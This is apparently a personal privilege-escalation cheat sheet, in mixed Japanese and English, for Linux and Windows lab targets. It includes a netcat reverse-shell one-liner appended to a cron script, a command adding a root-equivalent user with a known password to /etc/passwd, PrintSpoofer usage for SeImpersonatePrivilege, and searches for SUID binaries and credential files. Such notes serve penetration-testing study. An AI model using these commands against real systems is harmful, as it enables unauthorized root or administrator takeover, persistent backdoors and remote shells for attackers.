# suid file
find / -perm -u=s -type f 2>/dev/null
nd / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null


#cronのログをみる
cat /var/log/cron.log 

# archive見る
find / -name "archiv*" 2>/dev/null

#cronのファイルにかくやつ
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.247 3333 >/tmp/f" >> /var/archives/archive.sh


# 書き込めるファイル確認
find / -writable -type f 2>/dev/null | grep -vE '^/(home|proc)/'

# passに書き込み
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
user名:root2
pass:w00t

su root2で権限昇格できる


# Windows event log
eventviewrからpowershellのログを確認し、4104で検索するとパスワードわかるかも


# winpease
cp /usr/share/peass/winpeas/winPEASx64.exe .

# windows
whoami /priv

下記だったらprint spoofer使える
SeImpersonatePrivilege        Impersonate a client after authentication Enabled

# PrintSpoofer64.exe 
.\PrintSpoofer64.exe -i -c powershell.exe

# 管理者権限持つユーザを調べる
net localgroup administrators

# 現在いるユーザを調べる
net user

# いい感じのファイルないか調べる
Get-ChildItem -Path C:\users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue